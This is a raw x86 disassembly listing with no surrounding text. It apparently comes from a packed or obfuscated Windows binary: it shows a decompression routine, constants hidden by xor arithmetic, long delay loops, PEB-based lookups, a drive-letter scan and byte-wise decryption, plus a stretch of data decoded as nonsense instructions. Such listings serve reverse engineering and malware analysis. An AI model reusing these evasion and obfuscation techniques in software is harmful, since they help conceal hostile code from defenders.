  426012:	sub    esi,0x4
  426015:	call   0x4260bf
  42601a:	shr    ebx,1
  42601c:	shl    DWORD PTR [ebp-0x24],1
  42601f:	cmp    DWORD PTR [ebp-0x20],ebx
  426022:	jb     0x42602a
  426024:	inc    DWORD PTR [ebp-0x24]
  426027:	sub    DWORD PTR [ebp-0x20],ebx
  42602a:	dec    esi
  42602b:	jne    0x426015
  42602d:	mov    eax,0x644
  426032:	add    eax,DWORD PTR [ebp-0x38]
  426035:	mov    DWORD PTR [ebp-0x34],eax
  426038:	shl    DWORD PTR [ebp-0x24],0x4
  42603c:	push   0x4
  42603e:	pop    esi
  42603f:	sub    edi,edi
  426041:	inc    edi
  426042:	mov    eax,edi
  426044:	mov    ebp,DWORD PTR [ebp-0x34]
  426047:	call   0x426102
  42604c:	test   al,0x1
  42604e:	je     0x426053
  426050:	or     DWORD PTR [ebp-0x24],edi
  426053:	shl    edi,1
  426055:	dec    esi
  426056:	jne    0x426044
  426058:	jmp    0x42605a
  42605a:	inc    DWORD PTR [ebp-0x24]
  42605d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426060:	add    ecx,0x2
  426063:	mov    edi,DWORD PTR [ebp-0x4]
  426066:	mov    eax,edi
  426068:	sub    eax,DWORD PTR [ebp+0x24]
  42606b:	cmp    DWORD PTR [ebp-0x24],eax
  42606e:	ja     0x4260ba
  426070:	mov    esi,edi
  426072:	sub    esi,DWORD PTR [ebp-0x24]
  426075:	mov    edx,DWORD PTR [ebp+0x28]
  426078:	lods   al,BYTE PTR ds:[esi]
  426079:	stos   BYTE PTR es:[edi],al
  42607a:	cmp    edi,edx
  42607c:	jae    0x426081
  42607e:	dec    ecx
  42607f:	jne    0x426078
  426081:	mov    DWORD PTR [ebp-0x4],edi
  426084:	movzx  esi,al
  426087:	cmp    edi,DWORD PTR [ebp+0x28]
  42608a:	jb     0x425deb
  426090:	call   0x4260bf
  426095:	sub    eax,eax
  426097:	lea    ebp,[esp+0x3c]
  42609b:	mov    edx,DWORD PTR [ebp+0x20]
  42609e:	mov    esi,DWORD PTR [ebp-0x8]
  4260a1:	sub    esi,DWORD PTR [ebp+0x18]
  4260a4:	mov    DWORD PTR [edx],esi
  4260a6:	mov    dh,0xdd
  4260a8:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  4260ae:	sbb    BYTE PTR [esi+0x1f5af70],ch
  4260b4:	add    eax,0x188f893
  4260b9:	jmp    0x37cbebf2
  4260be:	jmp    0x42604e
  4260c0:	ja     0x42604a
  4260c2:	mov    BYTE PTR [eax-0x6873ae74],cl
  4260c8:	(bad)  
  4260c9:	pop    ss
  4260ca:	test   al,0xe1
  4260cc:	mov    dh,0x5d
  4260ce:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  4260d3:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  4260d9:	test   al,0x3a
  4260db:	scas   al,BYTE PTR es:[edi]
  4260dc:	popf   
  4260dd:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  4260e3:	mov    dh,0xbd
  4260e5:	fwait
  4260e6:	les    esp,FWORD PTR [edx-0x75]
  4260e9:	(bad)  
  4260ea:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  4260f2:	mov    al,ds:0x948b62c4
  4260f7:	popf   
  4260f8:	fwait
  4260f9:	mov    dh,0x3d
  4260fb:	stos   DWORD PTR es:[edi],eax
  4260fc:	mov    esi,0x34889d39
  426101:	mov    edi,DWORD PTR [esi-0x717762c7]
  426107:	ja     0x426091
  426109:	mov    BYTE PTR [eax-0x4907aa74],cl
  42610f:	mov    ecx,0x198f6818
  426114:	sbb    BYTE PTR [eax],cl
  426116:	test   al,0x74
  426118:	mov    ecx,0xfa55f918
  42611d:	mov    dl,0xcc
  42611f:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  426125:	test   al,0x88
  426127:	push   esp
  426128:	and    al,0x20
  42612a:	mov    ecx,ebx
  42612c:	movzx  edx,WORD PTR [ebp+0x0]
  426130:	shr    ecx,0xb
  426133:	imul   ecx,edx
  426136:	cmp    DWORD PTR [esp+0x20],ecx
  42613a:	jae    0x426153
  42613c:	mov    ebx,ecx
  42613e:	mov    ecx,0x800
  426143:	sub    ecx,edx
  426145:	shr    ecx,0x5
  426148:	add    WORD PTR [ebp+0x0],cx
  42614c:	add    eax,eax
  42614e:	lea    ebp,[esp+0x40]
  426152:	ret    
  426153:	shr    edx,0x5
  426156:	sub    DWORD PTR [esp+0x20],ecx
  42615a:	sub    ebx,ecx
  42615c:	sub    WORD PTR [ebp+0x0],dx
  426160:	add    eax,eax
  426162:	add    eax,0x1
  426165:	lea    ebp,[esp+0x40]
  426169:	ret    
  42616a:	push   ebp
  42616b:	mov    ebp,esp
  42616d:	sub    esp,0x12c
  426173:	push   ebx
  426174:	push   esi
  426175:	push   edi
  426176:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42617d:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426184:	mov    eax,DWORD PTR [ebp+0x8]
  426187:	mov    DWORD PTR [ebp+0x8],eax
  42618a:	mov    ecx,DWORD PTR [ebp-0x10]
  42618d:	mov    ebx,0x75108ae
  426192:	xor    ecx,ebx
  426194:	mov    eax,0x3272f5
  426199:	add    ecx,eax
  42619b:	mov    DWORD PTR [ebp-0x24],ecx
  42619e:	mov    ecx,DWORD PTR [ebp-0x10]
  4261a1:	xor    ecx,ebx
  4261a3:	add    ecx,eax
  4261a5:	mov    DWORD PTR [ebp-0x40],ecx
  4261a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4261ab:	xor    ecx,ebx
  4261ad:	add    ecx,eax
  4261af:	mov    DWORD PTR [ebp-0x3c],ecx
  4261b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4261b5:	xor    ecx,ebx
  4261b7:	add    ecx,eax
  4261b9:	mov    DWORD PTR [ebp-0xd8],ecx
  4261bf:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  4261c6:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  4261cd:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  4261d4:	push   0x25
  4261d6:	pop    ecx
  4261d7:	mov    DWORD PTR [ebp-0x30],ecx
  4261da:	mov    DWORD PTR [ebp-0x30],ecx
  4261dd:	push   0x65
  4261df:	pop    ecx
  4261e0:	mov    DWORD PTR [ebp-0x30],ecx
  4261e3:	mov    DWORD PTR [ebp-0x30],ecx
  4261e6:	mov    DWORD PTR [ebp-0x30],0x4d
  4261ed:	mov    DWORD PTR [ebp-0x30],0x43
  4261f4:	mov    ecx,DWORD PTR [ebp-0x10]
  4261f7:	xor    ecx,ebx
  4261f9:	add    ecx,eax
  4261fb:	mov    DWORD PTR [ebp-0x30],ecx
  4261fe:	mov    ecx,DWORD PTR [ebp-0x10]
  426201:	xor    ecx,ebx
  426203:	add    ecx,eax
  426205:	mov    DWORD PTR [ebp-0x30],ecx
  426208:	mov    DWORD PTR [ebp-0x28],0x258
  42620f:	mov    DWORD PTR [ebp-0x34],0x36
  426216:	mov    DWORD PTR [ebp-0x14],0x7a
  42621d:	lea    edi,[ebp-0x10c]
  426223:	lea    esi,[ebp-0x12c]
  426229:	call   0x426ee9
  42622e:	dec    DWORD PTR [ebp-0x14]
  426231:	jne    0x42621d
  426233:	dec    DWORD PTR [ebp-0x34]
  426236:	jne    0x426216
  426238:	dec    DWORD PTR [ebp-0x28]
  42623b:	jne    0x42620f
  42623d:	mov    DWORD PTR [ebp-0x28],0x400e
  426244:	mov    eax,DWORD PTR [ebp-0x10]
  426247:	xor    eax,ebx
  426249:	mov    esi,0x3272f5
  42624e:	add    eax,esi
  426250:	mov    DWORD PTR [ebp-0x1c],eax
  426253:	mov    eax,DWORD PTR [ebp-0x10]
  426256:	and    DWORD PTR [ebp-0x94],0x0
  42625d:	xor    eax,ebx
  42625f:	add    eax,esi
  426261:	mov    DWORD PTR [ebp-0x38],eax
  426264:	mov    eax,fs:0x18
  42626a:	mov    DWORD PTR [ebp-0x94],eax
  426270:	mov    eax,DWORD PTR [eax+0x30]
  426273:	mov    DWORD PTR [ebp-0xcc],eax
  426279:	mov    eax,DWORD PTR [eax+0xc]
  42627c:	mov    DWORD PTR [ebp-0xc0],eax
  426282:	mov    eax,DWORD PTR [ebp+0x8]
  426285:	lea    ecx,[ebp-0x94]
  42628b:	mov    DWORD PTR [eax+0x1a0],ecx
  426291:	mov    eax,DWORD PTR [ebp+0x8]
  426294:	lea    ecx,[ebp-0xcc]
  42629a:	mov    DWORD PTR [eax+0x1a4],ecx
  4262a0:	mov    eax,DWORD PTR [ebp+0x8]
  4262a3:	push   DWORD PTR [ebp+0x8]
  4262a6:	lea    ecx,[ebp-0xc0]
  4262ac:	mov    DWORD PTR [eax+0x1a8],ecx
  4262b2:	call   0x4286aa
  4262b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4262ba:	xor    ecx,ebx
  4262bc:	add    ecx,esi
  4262be:	cmp    ecx,eax
  4262c0:	je     0x426643
  4262c6:	mov    eax,DWORD PTR [ebp+0x8]
  4262c9:	mov    eax,DWORD PTR [eax+0x194]
  4262cf:	mov    ecx,DWORD PTR [eax]
  4262d1:	mov    eax,DWORD PTR [ebp+0x8]
  4262d4:	mov    eax,DWORD PTR [eax+0x194]
  4262da:	mov    eax,DWORD PTR [eax]
  4262dc:	add    eax,DWORD PTR [ecx+0x3c]
  4262df:	mov    ecx,DWORD PTR [ebp+0x8]
  4262e2:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4262e8:	lea    edx,[ebp-0xec]
  4262ee:	push   edx
  4262ef:	mov    edx,DWORD PTR [ebp+0x8]
  4262f2:	mov    edx,DWORD PTR [edx+0x18c]
  4262f8:	mov    edx,DWORD PTR [edx]
  4262fa:	add    edx,DWORD PTR [eax+0x88]
  426300:	push   0x4
  426302:	push   DWORD PTR [eax+0x8c]
  426308:	push   edx
  426309:	call   DWORD PTR [ecx+0x1c]
  42630c:	push   DWORD PTR [ebp+0x8]
  42630f:	xor    eax,eax
  426311:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  42631b:	mov    DWORD PTR [ebp-0xa4],0x12371120
  426325:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  42632f:	mov    BYTE PTR [ebp-0x9c],0x83
  426336:	lea    edi,[ebp-0x9b]
  42633c:	stos   DWORD PTR es:[edi],eax
  42633d:	stos   WORD PTR es:[edi],ax
  42633f:	stos   BYTE PTR es:[edi],al
  426340:	xor    eax,eax
  426342:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  42634c:	mov    DWORD PTR [ebp-0xb8],0x12371120
  426356:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  426360:	mov    BYTE PTR [ebp-0xb0],0x83
  426367:	lea    edi,[ebp-0xaf]
  42636d:	stos   DWORD PTR es:[edi],eax
  42636e:	stos   WORD PTR es:[edi],ax
  426370:	stos   BYTE PTR es:[edi],al
  426371:	mov    edi,DWORD PTR [ebp+0x8]
  426374:	mov    eax,DWORD PTR [ebp+0x8]
  426377:	mov    edx,DWORD PTR [eax+0x1b8]
  42637d:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426384:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42638b:	mov    WORD PTR [ebp-0x60],0x8340
  426391:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42639b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  4263a5:	mov    DWORD PTR [ebp-0x88],0x35201b13
  4263af:	mov    DWORD PTR [ebp-0x84],0x111c140c
  4263b9:	mov    DWORD PTR [ebp-0x80],0x83401e18
  4263c0:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  4263c7:	mov    DWORD PTR [ebp-0x78],0x17401120
  4263ce:	mov    DWORD PTR [ebp-0x74],0x35201b13
  4263d5:	mov    DWORD PTR [ebp-0x70],0x111c140c
  4263dc:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  4263e3:	call   0x4286d9
  4263e8:	push   eax
  4263e9:	mov    eax,DWORD PTR [ebp+0x8]
  4263ec:	mov    eax,DWORD PTR [eax+0x1a8]
  4263f2:	push   DWORD PTR [eax]
  4263f4:	call   0x42837a
  4263f9:	test   eax,eax
  4263fb:	jne    0x42644d
  4263fd:	mov    eax,DWORD PTR [ebp+0x8]
  426400:	mov    eax,DWORD PTR [eax+0x1e0]
  426406:	mov    edi,DWORD PTR [ebp+0x8]
  426409:	add    eax,0x4
  42640c:	mov    DWORD PTR [ebp-0x20],eax
  42640f:	mov    eax,DWORD PTR [ebp+0x8]
  426412:	mov    edx,DWORD PTR [eax+0x1b8]
  426418:	call   0x4286d9
  42641d:	push   eax
  42641e:	mov    eax,DWORD PTR [ebp-0x20]
  426421:	call   DWORD PTR [eax]
  426423:	test   eax,eax
  426425:	jne    0x42644d
  426427:	mov    eax,DWORD PTR [ebp+0x8]
  42642a:	mov    eax,DWORD PTR [eax+0x1e0]
  426430:	mov    edi,DWORD PTR [ebp+0x8]
  426433:	add    eax,0x10
  426436:	mov    DWORD PTR [ebp-0x20],eax
  426439:	mov    eax,DWORD PTR [ebp+0x8]
  42643c:	mov    edx,DWORD PTR [eax+0x1b8]
  426442:	call   0x4286d9
  426447:	push   eax
  426448:	mov    eax,DWORD PTR [ebp-0x20]
  42644b:	call   DWORD PTR [eax]
  42644d:	mov    eax,DWORD PTR [ebp-0x10]
  426450:	mov    ecx,DWORD PTR [ebp-0x28]
  426453:	xor    eax,ebx
  426455:	add    eax,esi
  426457:	cmp    eax,ecx
  426459:	je     0x42661c
  42645f:	mov    eax,DWORD PTR [ebp-0x18]
  426462:	xor    eax,ebx
  426464:	mov    ecx,0xffcd8d0b
  426469:	sub    ecx,eax
  42646b:	add    ecx,DWORD PTR [ebp-0x28]
  42646e:	mov    eax,DWORD PTR [ebp-0x1c]
  426471:	cmp    eax,ecx
  426473:	ja     0x42661c
  426479:	mov    DWORD PTR [ebp-0x34],0x0
  426480:	push   DWORD PTR [ebp+0x8]
  426483:	mov    edi,DWORD PTR [ebp+0x8]
  426486:	mov    eax,DWORD PTR [ebp+0x8]
  426489:	mov    edx,DWORD PTR [eax+0x1b4]
  42648f:	call   0x4286d9
  426494:	push   eax
  426495:	mov    eax,DWORD PTR [ebp+0x8]
  426498:	mov    eax,DWORD PTR [eax+0x1a8]
  42649e:	push   DWORD PTR [eax]
  4264a0:	call   0x42837a
  4264a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4264a8:	mov    ecx,DWORD PTR [ecx+0x19c]
  4264ae:	mov    DWORD PTR [ecx],eax
  4264b0:	mov    eax,DWORD PTR [ebp+0x8]
  4264b3:	mov    edi,DWORD PTR [eax+0x1e0]
  4264b9:	mov    esi,DWORD PTR [ebp+0x8]
  4264bc:	xor    eax,eax
  4264be:	lea    edx,[ebp-0x7c]
  4264c1:	call   0x42870f
  4264c6:	push   eax
  4264c7:	mov    eax,DWORD PTR [ebp+0x8]
  4264ca:	mov    eax,DWORD PTR [eax+0x19c]
  4264d0:	push   DWORD PTR [eax]
  4264d2:	call   DWORD PTR [edi+0x8]
  4264d5:	mov    DWORD PTR [ebp-0x20],eax
  4264d8:	mov    eax,DWORD PTR [ebp+0x8]
  4264db:	mov    edi,DWORD PTR [eax+0x1e0]
  4264e1:	mov    esi,DWORD PTR [ebp+0x8]
  4264e4:	xor    eax,eax
  4264e6:	lea    edx,[ebp-0x90]
  4264ec:	call   0x42870f
  4264f1:	push   eax
  4264f2:	mov    eax,DWORD PTR [ebp+0x8]
  4264f5:	mov    eax,DWORD PTR [eax+0x19c]
  4264fb:	push   DWORD PTR [eax]
  4264fd:	call   DWORD PTR [edi+0x8]
  426500:	mov    eax,DWORD PTR [ebp+0x8]
  426503:	mov    edi,DWORD PTR [eax+0x1e0]
  426509:	mov    esi,DWORD PTR [ebp+0x8]
  42650c:	xor    eax,eax
  42650e:	lea    edx,[ebp-0xa8]
  426514:	call   0x42870f
  426519:	push   eax
  42651a:	mov    eax,DWORD PTR [ebp+0x8]
  42651d:	mov    eax,DWORD PTR [eax+0x19c]
  426523:	push   DWORD PTR [eax]
  426525:	call   DWORD PTR [edi+0x8]
  426528:	and    DWORD PTR [ebp-0x8],0x0
  42652c:	mov    DWORD PTR [ebp-0x48],eax
  42652f:	mov    eax,DWORD PTR [ebp-0x8]
  426532:	and    eax,0x7
  426535:	add    eax,0x31
  426538:	push   eax
  426539:	call   DWORD PTR [ebp-0x20]
  42653c:	test   eax,eax
  42653e:	je     0x426582
  426540:	mov    eax,DWORD PTR [ebp-0x8]
  426543:	push   0x19
  426545:	xor    edx,edx
  426547:	pop    ecx
  426548:	div    ecx
  42654a:	add    dl,0x41
  42654d:	movzx  eax,dl
  426550:	push   eax
  426551:	call   DWORD PTR [ebp-0x48]
  426554:	test   eax,eax
  426556:	jne    0x426582
  426558:	mov    eax,DWORD PTR [ebp+0x8]
  42655b:	mov    edi,DWORD PTR [eax+0x1e0]
  426561:	mov    esi,DWORD PTR [ebp+0x8]
  426564:	xor    eax,eax
  426566:	lea    edx,[ebp-0x68]
  426569:	call   0x42870f
  42656e:	push   eax
  42656f:	mov    eax,DWORD PTR [ebp+0x8]
  426572:	mov    eax,DWORD PTR [eax+0x198]
  426578:	push   DWORD PTR [eax]
  42657a:	call   DWORD PTR [edi+0x8]
  42657d:	mov    DWORD PTR [ebp-0x14],eax
  426580:	jmp    0x426586
  426582:	and    DWORD PTR [ebp-0x14],0x0
  426586:	inc    DWORD PTR [ebp-0x8]
  426589:	cmp    DWORD PTR [ebp-0x8],0x10
  42658d:	jb     0x42652f
  42658f:	mov    eax,DWORD PTR [ebp-0x18]
  426592:	mov    esi,DWORD PTR [ebp+0x8]
  426595:	xor    eax,ebx
  426597:	mov    edi,0x3272f5
  42659c:	add    eax,edi
  42659e:	lea    edx,[ebp-0x10c]
  4265a4:	call   0x42870f
  4265a9:	push   eax
  4265aa:	mov    eax,DWORD PTR [ebp-0x10]
  4265ad:	mov    esi,DWORD PTR [ebp+0x8]
  4265b0:	xor    eax,ebx
  4265b2:	add    eax,edi
  4265b4:	lea    edx,[ebp-0x12c]
  4265ba:	call   0x42870f
  4265bf:	push   eax
  4265c0:	call   DWORD PTR [ebp-0x14]
  4265c3:	mov    ecx,DWORD PTR [ebp-0x10]
  4265c6:	xor    ecx,ebx
  4265c8:	add    ecx,edi
  4265ca:	cmp    ecx,eax
  4265cc:	jne    0x4265d5
  4265ce:	mov    DWORD PTR [ebp-0x34],0x1
  4265d5:	mov    eax,DWORD PTR [ebp-0x18]
  4265d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265db:	xor    eax,ebx
  4265dd:	lea    eax,[eax+ecx*1+0x3272f5]
  4265e4:	mov    DWORD PTR [ebp-0x1c],eax
  4265e7:	mov    eax,DWORD PTR [ebp-0x34]
  4265ea:	test   eax,eax
  4265ec:	je     0x426600
  4265ee:	mov    eax,DWORD PTR [ebp-0x18]
  4265f1:	mov    ecx,DWORD PTR [ebp-0x38]
  4265f4:	xor    eax,ebx
  4265f6:	lea    eax,[eax+ecx*1+0x3272f5]
  4265fd:	mov    DWORD PTR [ebp-0x38],eax
  426600:	mov    eax,DWORD PTR [ebp-0x18]
  426603:	xor    eax,ebx
  426605:	mov    ecx,0xffcd8d0b
  42660a:	sub    ecx,eax
  42660c:	add    ecx,DWORD PTR [ebp-0x28]
  42660f:	mov    eax,DWORD PTR [ebp-0x1c]
  426612:	cmp    eax,ecx
  426614:	jbe    0x426479
  42661a:	mov    esi,edi
  42661c:	mov    eax,DWORD PTR [ebp-0x38]
  42661f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426622:	cmp    ecx,eax
  426624:	jne    0x426637
  426626:	push   DWORD PTR [ebp+0x8]
  426629:	lea    eax,[ebp-0x40]
  42662c:	push   eax
  42662d:	call   0x42917e
  426632:	mov    DWORD PTR [ebp-0x24],eax
  426635:	jmp    0x426643
  426637:	mov    eax,DWORD PTR [ebp-0x24]
  42663a:	mov    ecx,DWORD PTR [ebp-0x18]
  42663d:	xor    ecx,ebx
  42663f:	add    ecx,esi
  426641:	xor    DWORD PTR [eax],ecx
  426643:	mov    eax,DWORD PTR [ebp-0x10]
  426646:	mov    ecx,DWORD PTR [ebp-0x24]
  426649:	xor    eax,ebx
  42664b:	add    eax,esi
  42664d:	cmp    eax,ecx
  42664f:	je     0x426dc7
  426655:	mov    eax,DWORD PTR [ebp-0x10]
  426658:	mov    ecx,DWORD PTR [ebp-0x40]
  42665b:	xor    eax,ebx
  42665d:	add    eax,esi
  42665f:	cmp    eax,ecx
  426661:	je     0x426dc7
  426667:	mov    eax,DWORD PTR [ebp-0x10]
  42666a:	xor    eax,ebx
  42666c:	add    eax,esi
  42666e:	jmp    0x42668c
  426670:	mov    edi,DWORD PTR [ebp-0x24]
  426673:	mov    cl,al
  426675:	and    cl,0x1f
  426678:	or     dl,0xff
  42667b:	sub    dl,cl
  42667d:	add    BYTE PTR [edi+eax*1],dl
  426680:	mov    ecx,DWORD PTR [ebp-0x18]
  426683:	xor    ecx,ebx
  426685:	lea    eax,[eax+ecx*1+0x3272f5]
  42668c:	mov    ecx,DWORD PTR [ebp-0x40]
  42668f:	cmp    eax,ecx
  426691:	jb     0x426670
  426693:	mov    eax,DWORD PTR [ebp-0x40]
  426696:	mov    DWORD PTR [ebp-0x28],eax
  426699:	mov    eax,DWORD PTR [ebp-0x24]
  42669c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4266a3:	mov    DWORD PTR [ebp-0xd4],eax
  4266a9:	mov    edi,0xf89c85a2
  4266ae:	mov    DWORD PTR [ebp-0x2c],edi
  4266b1:	mov    eax,DWORD PTR [ebp-0x38]
  4266b4:	xor    eax,ebx
  4266b6:	add    eax,esi
  4266b8:	mov    DWORD PTR [ebp-0xc],eax
  4266bb:	mov    eax,DWORD PTR [ebp-0x38]
  4266be:	xor    eax,ebx
  4266c0:	add    eax,esi
  4266c2:	mov    DWORD PTR [ebp-0x8],eax
  4266c5:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4266cc:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  4266d3:	mov    eax,DWORD PTR [ebp-0x38]
  4266d6:	mov    ecx,DWORD PTR [ebp-0x28]
  4266d9:	xor    eax,ebx
  4266db:	add    eax,esi
  4266dd:	cmp    ecx,eax
  4266df:	je     0x4268de
  4266e5:	jmp    0x4268ba
  4266ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4266ed:	mov    eax,DWORD PTR [ebp-0x28]
  4266f0:	sub    eax,ecx
  4266f2:	mov    ecx,DWORD PTR [ebp-0x48]
  4266f5:	xor    ecx,ebx
  4266f7:	add    ecx,esi
  4266f9:	xor    edx,edx
  4266fb:	div    ecx
  4266fd:	mov    DWORD PTR [ebp-0x8],eax
  426700:	mov    eax,DWORD PTR [ebp-0x4c]
  426703:	mov    ecx,DWORD PTR [ebp-0x8]
  426706:	xor    eax,ebx
  426708:	add    eax,esi
  42670a:	cmp    ecx,eax
  42670c:	jbe    0x426718
  42670e:	mov    eax,DWORD PTR [ebp-0x4c]
  426711:	xor    eax,ebx
  426713:	add    eax,esi
  426715:	mov    DWORD PTR [ebp-0x8],eax
  426718:	mov    eax,DWORD PTR [ebp-0x48]
  42671b:	mov    ecx,DWORD PTR [ebp-0x8]
  42671e:	xor    eax,ebx
  426720:	add    eax,esi
  426722:	imul   eax,ecx
  426725:	mov    DWORD PTR [ebp-0x8],eax
  426728:	mov    eax,DWORD PTR [ebp-0x38]
  42672b:	mov    ecx,DWORD PTR [ebp-0x8]
  42672e:	xor    eax,ebx
  426730:	add    eax,esi
  426732:	cmp    ecx,eax
  426734:	je     0x4268a8
  42673a:	mov    eax,DWORD PTR [ebp-0x8]
  42673d:	mov    DWORD PTR [ebp-0x14],eax
  426740:	mov    eax,DWORD PTR [ebp-0xc]
  426743:	add    eax,DWORD PTR [ebp-0xd4]
  426749:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426750:	mov    DWORD PTR [ebp-0x34],edi
  426753:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  42675d:	mov    DWORD PTR [ebp-0x8],eax
  426760:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426767:	mov    DWORD PTR [ebp-0x1c],edi
  42676a:	mov    eax,DWORD PTR [ebp-0x20]
  42676d:	xor    eax,ebx
  42676f:	add    eax,esi
  426771:	jmp    0x426867
  426776:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426780:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42678a:	mov    eax,DWORD PTR [ebp-0x1c]
  42678d:	mov    ecx,DWORD PTR [ebp-0x44]
  426790:	xor    eax,ebx
  426792:	add    eax,esi
  426794:	imul   eax,ecx
  426797:	mov    ecx,DWORD PTR [ebp-0x8]
  42679a:	mov    al,BYTE PTR [eax+ecx*1]
  42679d:	mov    BYTE PTR [ebp-0x2],al
  4267a0:	mov    eax,DWORD PTR [ebp-0x1c]
  4267a3:	mov    ecx,DWORD PTR [ebp-0x44]
  4267a6:	xor    eax,ebx
  4267a8:	add    eax,esi
  4267aa:	imul   eax,ecx
  4267ad:	mov    ecx,DWORD PTR [ebp-0xe8]
  4267b3:	xor    ecx,ebx
  4267b5:	add    eax,ecx
  4267b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4267ba:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4267c2:	mov    ecx,DWORD PTR [ebp-0xe0]
  4267c8:	xor    ecx,ebx
  4267ca:	lea    eax,[ecx+eax*1+0x3272f5]
  4267d1:	movzx  ecx,BYTE PTR [ebp-0x2]
  4267d5:	xor    ecx,eax
  4267d7:	mov    BYTE PTR [ebp-0x2],cl
  4267da:	mov    al,BYTE PTR [ebp-0x2]
  4267dd:	mov    ecx,DWORD PTR [ebp-0x1c]
  4267e0:	mov    edx,DWORD PTR [ebp-0x44]
  4267e3:	xor    ecx,ebx
  4267e5:	add    ecx,esi
  4267e7:	imul   ecx,edx
  4267ea:	mov    edx,DWORD PTR [ebp-0x8]
  4267ed:	mov    BYTE PTR [ecx+edx*1],al
  4267f0:	mov    eax,DWORD PTR [ebp-0x1c]
  4267f3:	mov    ecx,DWORD PTR [ebp-0x44]
  4267f6:	xor    eax,ebx
  4267f8:	add    eax,esi
  4267fa:	imul   eax,ecx
  4267fd:	mov    ecx,DWORD PTR [ebp-0x8]
  426800:	mov    al,BYTE PTR [eax+ecx*1]
  426803:	mov    BYTE PTR [ebp-0x2],al
  426806:	mov    eax,DWORD PTR [ebp-0x1c]
  426809:	mov    ecx,DWORD PTR [ebp-0x44]
  42680c:	xor    eax,ebx
  42680e:	add    eax,esi
  426810:	imul   eax,ecx
  426813:	mov    ecx,DWORD PTR [ebp-0x34]
  426816:	xor    ecx,ebx
  426818:	add    eax,ecx
  42681a:	mov    ecx,DWORD PTR [ebp-0x8]
  42681d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426825:	mov    ecx,DWORD PTR [ebp-0xc4]
  42682b:	xor    ecx,ebx
  42682d:	lea    eax,[ecx+eax*1+0x3272f5]
  426834:	movzx  ecx,BYTE PTR [ebp-0x2]
  426838:	xor    ecx,eax
  42683a:	mov    BYTE PTR [ebp-0x2],cl
  42683d:	mov    al,BYTE PTR [ebp-0x2]
  426840:	mov    ecx,DWORD PTR [ebp-0x1c]
  426843:	mov    edx,DWORD PTR [ebp-0x44]
  426846:	xor    ecx,ebx
  426848:	add    ecx,esi
  42684a:	imul   ecx,edx
  42684d:	mov    edx,DWORD PTR [ebp-0x8]
  426850:	mov    BYTE PTR [ecx+edx*1],al
  426853:	mov    eax,DWORD PTR [ebp-0x30]
  426856:	mov    ecx,DWORD PTR [ebp-0x34]
  426859:	xor    eax,ebx
  42685b:	xor    ecx,ebx
  42685d:	add    eax,esi
  42685f:	add    ecx,esi
  426861:	imul   eax,ecx
  426864:	add    eax,DWORD PTR [ebp-0x44]
  426867:	mov    DWORD PTR [ebp-0x44],eax
  42686a:	mov    eax,DWORD PTR [ebp-0x44]
  42686d:	mov    ecx,DWORD PTR [ebp-0x14]
  426870:	cmp    ecx,eax
  426872:	jb     0x426776
  426878:	mov    eax,DWORD PTR [ebp-0x34]
  42687b:	mov    ecx,DWORD PTR [ebp-0x14]
  42687e:	xor    eax,ebx
  426880:	add    eax,esi
  426882:	imul   eax,ecx
  426885:	mov    ecx,DWORD PTR [ebp-0x20]
  426888:	xor    ecx,ebx
  42688a:	add    ecx,esi
  42688c:	or     eax,ecx
  42688e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426891:	xor    ecx,ebx
  426893:	add    eax,ecx
  426895:	mov    ecx,DWORD PTR [ebp-0x2c]
  426898:	xor    ecx,ebx
  42689a:	add    eax,ecx
  42689c:	mov    ecx,DWORD PTR [ebp-0xc]
  42689f:	lea    eax,[eax+ecx*1+0x64e5ea]
  4268a6:	jmp    0x4268b7
  4268a8:	mov    eax,DWORD PTR [ebp-0x2c]
  4268ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4268ae:	xor    eax,ebx
  4268b0:	lea    eax,[eax+ecx*1+0x3272f5]
  4268b7:	mov    DWORD PTR [ebp-0xc],eax
  4268ba:	mov    eax,DWORD PTR [ebp-0x2c]
  4268bd:	xor    eax,ebx
  4268bf:	mov    ecx,0xffcd8d0b
  4268c4:	sub    ecx,eax
  4268c6:	add    ecx,DWORD PTR [ebp-0x28]
  4268c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4268cc:	mov    edx,DWORD PTR [ebp-0xc]
  4268cf:	xor    eax,ebx
  4268d1:	add    eax,esi
  4268d3:	imul   eax,edx
